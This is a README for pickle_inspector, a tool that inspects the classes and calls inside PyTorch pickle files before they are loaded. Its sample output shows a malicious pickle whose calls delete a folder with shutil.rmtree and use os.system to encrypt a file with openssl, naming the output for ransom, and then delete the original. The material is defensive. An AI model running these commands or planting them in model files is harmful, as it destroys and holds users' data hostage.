# pickle_inspector 🥒🔬
Check what is in the pickle before eating it.

NOTE:
torch == 1.13.0 breaks using custom unpicklers, see https://github.com/pytorch/pytorch/issues/88438
until this is fixed, stick to 1.12.x or older.

```py
import torch
import pickle_inspector
result = torch.load('sus.pt', pickle_module=pickle_inspector.pickle)
for c in result.classes:
    print(c)
```
notice calls to `shutil.rmtree`, `os.system` or similar
```
> shutil.rmtree
> torch._utils._rebuild_tensor_v2
> collections.OrderedDict
> numpy.core.multiarray.scalar
> os.system
> numpy.dtype
> _codecs.encode
```
so we are taking a closer look at what is being called
```py
for c in result.calls:
    print(c)
```
and it seems like someone tried to delete something and ransom a file
```
> shutil.rmtree(('/very/important/folder'), {})
> collections.OrderedDict((), {})
> torch._utils._rebuild_tensor_v2((None, 0, (1000,), (1,), False, collections.OrderedDict((), {})), {})
...
> torch._utils._rebuild_tensor_v2((None, 0, (), (), False, collections.OrderedDict((), {})), {})
> os.system(('openssl enc -aes-128-ecb -in important_file -out give_money.enc -K 1337B00B135DEADBEEF; rm important_file'), {})
> numpy.dtype(('f8', False, True), {})
> numpy.dtype.__setstate__(((3, '<', None, None, None, -1, -1, 0),), {})
> _codecs.encode(('ñhã\x88µøÔ>', 'latin1'), {})
> numpy.core.multiarray.scalar((numpy.dtype(('f8', False, True), {}), _codecs.encode(('ñhã\x88µøÔ>', 'latin1'), {})), {})
```

tested with python 3.9 and torch 1.12
